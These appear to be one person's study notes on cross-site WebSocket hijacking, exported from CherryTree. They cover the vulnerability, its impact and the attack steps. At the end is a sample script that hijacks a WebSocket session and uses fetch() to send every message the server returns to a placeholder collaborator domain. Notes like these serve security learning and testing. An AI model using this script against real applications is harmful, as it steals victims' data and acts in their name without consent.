<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>XS WS Hijacking</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>XS WS Hijacking</h1><br/><strong>What is it?</strong><br />• CSRF vuln in WS handshake<br />• when WS handshake reliant on HTTP cookies for session handling (no CSRF tokens)<br />• Create malicious web page and establish WS connection<br />• Send messages to server via the connection<br />◇ Unlike CSRF, there are two-way interaction with compromised app.<br /><strong><br />Impact</strong><br />• Perform unauthorised actions pretending to be the victim user.<br />• Retrieve sensitive data<br /><strong><br />Performing an attack</strong><br />• review handshakes app carries out. <br />   ◇ Work out if they are protected against CSRF<br />   ◇ do they only do session management through cookies<br />• Sec-WebSocket-Key is NOT used for session handling.<br />• What to do once you&#39;ve made a connection<br />   ◇ Send messages to perform actions on anothers behalf<br />   ◇ Send messages to get sensitive data<br />   ◇ Wait until incoming messages containing that data.<br /><strong><br />Sample attack</strong><br />• Click around and check for WS interactions and if there are no CSRF tokens<br />   ◇ What responses are being sent back? Key Words? “Ready”?<br />• Find URL that makes initial WS handshake request<br />• Create your own exploit server:<br /><code>&lt;script&gt;<br />    websocket = new WebSocket(&#39;wss://the-websocket-URL&#39;)<br />    websocket.onopen = start<br />    websocket.onmessage = handleReply<br />    function start(event) {<br />      websocket.send(&quot;READY&quot;);<br />    }<br />		function handleReply(event) {<br />		  fetch(&#39;https://your-collaborator-domain/?&#39;+event.data, {mode: &#39;no-cors&#39;})<br />		}<br />&lt;/script&gt;                        </code><br />• open burp collaborator<br />• poll for stuff</div></body></html>